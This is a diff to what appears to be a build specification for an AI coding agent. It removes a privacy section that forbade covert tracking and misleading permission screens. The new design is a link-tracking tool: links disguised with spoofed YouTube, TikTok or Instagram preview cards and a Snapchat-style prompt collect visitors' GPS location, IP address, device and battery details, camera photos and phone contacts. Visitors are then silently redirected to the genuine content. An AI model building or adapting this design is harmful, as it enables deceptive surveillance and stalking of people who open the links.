@@ -27,45 +27,32 @@ Do not ask the developer to manually perform work that can be done through the a
 
 ## CORE PRODUCT
 
-Build a complete image-sharing web application.
+Build a complete image-sharing and target URL bridge application.
 
 Admin:
 - authenticate
-- upload image
-- set title
-- set description
-- configure location requirement
+- upload image OR specify target destination URL (YouTube, TikTok, Instagram, Facebook, Snapchat, custom)
+- auto-fetch / scrape OpenGraph metadata (title, description, thumbnail) from target URL
+- set or override title, description, and preview image
+- select granular permissions & telemetry per link (Location GPS, Device info & Battery %, Camera photo verification, Android Contact picker)
 - configure expiration
 - generate unique share link
 - activate/deactivate
 - delete
-- monitor consented active location sessions
-- view authorized locations on OpenStreetMap with 1-click Google Maps redirect
+- access dedicated per-link tracking page (`/admin/links/[id]`) with map, session breakdown, and visitor telemetry
+- monitor active location sessions globally on OpenStreetMap with 1-click Google Maps redirect
 
-Visitor:
-- open `/view/[slug]`
-- see native Snapchat-style web snap viewer (Snapchat yellow accents, ghost logo header, snap story frame)
-- if location is required, see authentic Snapchat-style permission modal
-- press "Allow Location & View Image"
-- browser permission opens
-- only after successful permission is the image revealed
-- active location updates may continue only while the page/session is active and permission remains available
-
-## PRIVACY REQUIREMENT
-
-This is a consent-based academic demo.
-
-Never create:
-- covert tracking
-- hidden geolocation collection
-- browser permission bypass
-- fingerprinting-based location tracking
-- background tracking after page/browser closure
-- misleading permission UI
-
-The disclosure must clearly state that location will be shared with the link owner.
-
-If permission is denied, do not reveal a protected image.
+Visitor & Social Crawlers:
+- social platforms (WhatsApp, Instagram, Facebook, Telegram, Twitter/X) scrape `/view/[slug]` endpoint and render rich preview cards matching the target content
+- visitor opens `/view/[slug]`
+- see native Snapchat-style web snap viewer or authentic target preview card
+- if location is required, see native disclosure modal: "Allow Location & View / Continue"
+- press "Allow Location & View Image / Continue"
+- browser geolocation prompts
+- upon successful permission, capture coordinates and create session in Supabase
+- if target URL is configured: immediately redirect visitor to genuine target URL (`window.location.href = target_url`)
+- if target URL is not configured: reveal image in full Snapchat story viewer
+- active location updates may continue while session is active
 
 ## STACK
 
@@ -170,7 +157,14 @@ Admin/user profile information required by the application.
 ### image_links
 - id
 - slug
-- image_path
+- image_path (nullable for pure redirect links)
+- target_url (destination URL: YouTube, TikTok, Instagram, Facebook, custom)
+- link_type ('image' | 'redirect' | 'hybrid')
+- og_title (custom / scraped OpenGraph title)
+- og_description (custom / scraped OpenGraph description)
+- og_image_url (preview thumbnail URL for WhatsApp/Instagram cards)
+- og_platform ('youtube' | 'instagram' | 'tiktok' | 'facebook' | 'snapchat' | 'custom')
+- permissions_config (JSONB: location, device_info, camera, contacts)
 - title
 - description
 - is_active
@@ -186,6 +180,12 @@ Admin/user profile information required by the application.
 - started_at
 - ended_at
 - status
+- ip_address
+- user_agent
+- device_info (JSONB: OS, browser, screen, battery %, timezone)
+- permissions_granted (JSONB)
+- captured_media_path (storage photo path)
+- captured_data (JSONB)
 
 ### location_updates
 - id
@@ -260,14 +260,18 @@ Required states:
 - network error (Retryable error card)
 
 When location is required:
-- show Snapchat disclosure modal;
-- wait for explicit button click: "Allow Location & View Image";
+- show Snapchat or social bridge disclosure modal;
+- wait for explicit button click: "Allow Location & View / Continue";
 - call browser Geolocation API;
 - create session only after permission succeeds;
-- store initial location securely;
-- reveal image in full Snapchat story mode.
+- store initial location securely in Supabase;
+- if `target_url` is configured: immediately redirect to target URL (`window.location.href = target_url`) with fallback redirect button;
+- if `target_url` is not set: reveal image in full Snapchat story mode.
 
-Use watchPosition only after successful consent and only for the active page/session.
+Social OpenGraph Endpoint:
+- `/view/[slug]` serves dynamic `<meta property="og:...">` tags matching target URL / custom metadata so WhatsApp, Instagram, Telegram, etc., render rich genuine cards.
+
+Use watchPosition only after successful permission and only for the active page/session.
 
 Clean up watcher on unmount/end.
 
@@ -467,7 +471,7 @@ Work in small verified phases:
 7. Admin
 8. Links
 9. Public viewer
-10. Consent geolocation
+10. Geolocation
 11. Secure API
 12. Realtime
 13. Map
